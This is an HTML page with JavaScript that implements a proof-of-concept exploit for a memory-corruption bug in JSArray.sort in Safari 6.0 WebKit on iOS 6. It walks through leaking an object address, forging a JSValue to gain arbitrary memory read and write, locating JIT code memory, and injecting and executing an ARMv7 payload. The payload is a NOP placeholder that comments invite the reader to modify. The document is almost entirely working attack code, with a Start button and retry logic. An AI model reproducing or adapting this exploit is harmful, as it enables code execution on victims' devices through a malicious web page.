<html>
<body>
<script src="inc/utils.js"></script>
<script type="text/javascript">

// global vars
var _gc, _cnt = 0;

function tryExpl_iOS32(att)
{
	try {      
    //
    // Part 1: getting the Uint32Array object address
    //
	    // init vars  	    
	    var u32 = new Uint32Array(8);
	    var a1 = [0,1,2,3,u32];	       
	    var a2 = [0,1,2,3,4]; // right after a1
	    var a1len = a1.length;
	    var a2len = a2.length;	
	    var u32len = u32.length;  
	    	         	    
	    // protect local vars from GC	         	    
	    if (!_gc) _gc = new Array();
	    _gc.push(u32,a1,a2);
	    
	    // declare custom compare function    
	    var myCompFunc = function(x,y)
	    {  	    	
	    	// check for the last call for two last array items
	    	if (y == 3 && x == u32) {
	    		logAdd("myCompFunc(u32,3)");	    	
	    		// shift() is calling during sort(), what causes the 
	    		// last array item is written outside the array buffer
	    		a1.shift();
	    	}	    	    		
	    	return 0;
	    } 
	    
	    // call the vulnerable method - JSArray.sort(...)
	    a1.sort(myCompFunc);
	           
	    // check results: a2.length should be overwritten by a1[4]   
	    var u32addr = a2.length;
	    logAdd("a2.length = 0x" + u32addr.toString(16));
	    if (u32addr == a2len) { logAdd("error: 1"); return 1; }
	    
    //
    // Part 2: creating corrupted JSValue which points to the (u32+0x28) address
    //
	  	
	  	// modify our compare function
		myCompFunc = function(x,y)
		{
	    	if (y == 0 && x == 1) {
	    		logAdd("myCompFunc(1,0)");   	
	    		// 
	    		// call shift() again to read the corrupted JSValue from a2.length 
	    		// into a1[3] on the next sort loop
	    		a1.length = a1len;
	    		a1.shift();
	    		// modify JSValue 
	    		a2.length = u32addr + 0x28;
	    	}
	    	if (y == 3) {
	    		logAdd("myCompFunc(x,3)");
	    		// shift it back to access a1[3]
	    		a1.unshift(0);
	    	}       		
	    	return 0;
	    } 
	    
	    // start sorting
		a1.sort(myCompFunc);
		
		// now a1[3] should contain the corrupted JSValue from a2.length (=u32addr+0x28)
		var c = a2.length;
		logAdd("a2.length = 0x" + c.toString(16));
		if (c != u32addr + 0x28) { logAdd("error: 2"); a1[3] = 0; return 2; }
		
	//
	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
	//
								
		// prepare objects for the third sort() call
		var mo = {};
	    var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }		
		var a3 = [0,1,2,a1[3]];
		
		// allocate mo's property storage right after a3's buffer
	    Object.defineProperty(mo, "prop0", pd);
	    for(var i=1; i < 7; i++){
	    	mo["prop"+i] = i;
	    }	
	    
	    // protect from GC
	    _gc.push(a3,mo,pd); 	
		
		// use sort-n-shift technique again
		myCompFunc = function(x,y)
		{  	
	    	// check for the last call for two last array items
	    	if (y == 2) {
	    		logAdd("myCompFunc(a3[3],2)"); 	
	    		// a3[3] will be written over the mo.prop0 object
	    		a3.shift();
	    	}	     		
	    	return 0;
	    } 
		
		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x28
	    a3.sort(myCompFunc);
	    // clear corrupted JSValue
	    a1[3] = 0; a3[3] = 0; 
	    
	    // construct the valid GetterSetter object
	    u32.prop1 = 8; 	// 8 = JSType.GetterSetterType
	    u32.prop2 = 8; 
	    u32.prop3 = 8;	    
	    u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure
	      
	    // prepare JSFunction which will be refered by u32.m_impl  
	    var f = new Function(" return 876543210 + " + (_cnt++) + ";");
  		f.prop2 = u2d(0x40000000,0x40000000); // a new value for u32.length
	    f();
	    
	    // overwrite u32.m_impl by the pd.get object
	    pd.get = f;
	    Object.defineProperty(mo, "prop0", pd);	
		
		// delete corrupted property
		delete mo.prop0;
		
		// check results: u32.length is taken from f's internals
		logAdd("u32.length = 0x" + u32.length.toString(16));
		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
		//logAdd("u32[] data:<br/>" + ArrayToString(u32,0,16)); // for RnD
		
	//
	//  Part 4: getting the JIT-code memory address
	//
			
		// find out the memory address of u32[0] (ArrayBufferView.m_baseAddress)
		var u32base = u32[0x40000000-2];
		logAdd("u32 address = 0x" + u32addr.toString(16));
		logAdd("u32 base = 0x" + u32base.toString(16));
			
		// declare aux functions 				
		var getU32 = function(addr) { 
			return u32[(addr - u32base) >>> 2]; 	
		}
		var setU32 = function(addr,val) { 
			return u32[(addr - u32base) >>> 2] = val; 	
		}
				
		// read ((JSFunction)f).m_executable;
		var jitObj = u32[8];
		logAdd("JIT object = 0x" + jitObj.toString(16));
		//logAdd(ArrayToString(u32, (jitObj - u32base) >>> 2, 32)); // for RnD
	
		// read ExecutableBase.m_jitCodeForCall
		jitObj += 0x10;
		var jitAddr = getU32(jitObj);
		logAdd("JIT address = 0x" + jitAddr.toString(16));
		if (!jitAddr) { logAdd("error: 4"); return 4; }
		//logAdd(ArrayToU8String(u32, (jitAddr - u32base) >>> 2, 64)); // for RnD
	
	//
	// Part 5: payload execution
	//

		// create "empty" payload for ARMv7 iOS
		var payload = U8toU32(new Uint8Array([			
			// custom part: empty payload (NOPs)
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF, 
			0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,  0x00,0xBF,0x00,0xBF,
			// ...			
			// payload returns 123 // modify it to ensure that payload works :)
			0x4F,0xF0,0x7B,0x00, 		// MOV.W   R0, #0x7B
			0x4F,0xF0,0xFF,0x31, 		// MOV.W   R1, #0xFFFFFFFF
			// mandatory part			
			0x55,0xF8,0x28,0x5C,		// LDR.W   R5,[R5,#-0x28]	
			0x70,0x47, 					// BX      LR
			0x00,0xBF
		]));
		
		// choose some place in f() JIT memory for payload
		var jaddr = jitAddr + 0x30; 
		setU32(jitObj, jaddr);
		logAdd("payload address = 0x" + jaddr.toString(16)); 	
		
		var res;	
						
		// copy payload into the f() JIT memory	
		jaddr = (jaddr - u32base) >>> 2;
		//logAdd("JIT data:<br/>" + ArrayToU8String(u32, jaddr, payload.length)); // for RnD
		exchangeArrays(payload, u32, jaddr);  
	   	ArrayToU8String(u32, jaddr, payload.length); // for JIT
					
		try {	
			// call payload		
			res = f();		
		}catch(e){
			logAdd("Error 5: " + e);
		}
		
		// restore overwritten JIT memory
		exchangeArrays(payload, u32, jaddr);
		//logAdd("JIT data:<br/>" + ArrayToU8String(u32, jaddr, payload.length)); // for RnD		
		
		// restore JIT-code pointer
		setU32(jitObj, jitAddr);
		
		// check that payload returns 123
		logAdd((res == 123 ? "Ok:":"Fail:") + " f() = " + res);		
		if (res != 123) { return 9; } // error						
	}
	catch(e) {
	    logAdd("Error: " + e);
	}
	
	return 0;
}

// "Start" button onclick handler
function btnClick()
{
	try {   
	    logAdd("======== Start ========");
		
		// check OS version
		if (navigator.platform.charAt(0) != "i") { logAdd("<font color=red>This works for iOS 6.0 only!</>"); return; }
		
	    // check Safari version
	    var vsn = navigator.userAgent;
	    if (vsn.indexOf("/6.0 ") <= 0 && vsn.indexOf("/6.0.0") <= 0 && vsn.indexOf("/6.0.1") <= 0) { 
	    	logAdd("<font color=red>Safari 6.0 or 6.0.1 is required!</>"); 
	    	//return; 
	    }
		
		// try several attempts to exploit
		for(var i=1; i < 5; i++){
			logAdd("<br/>Attempt #" + i + ":");
			if (tryExpl_iOS32(i) == 0) break;			
		}
		
		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
	}
	catch(e) {
	    logAdd(e);
	}
	_log = null;
}

// print environment info
writeEnvInfo();

</script>

<button style="width:100px;" onclick="btnClick();">Start</button>
<br/><br/>
<div id="log"></div>
</body>
</html>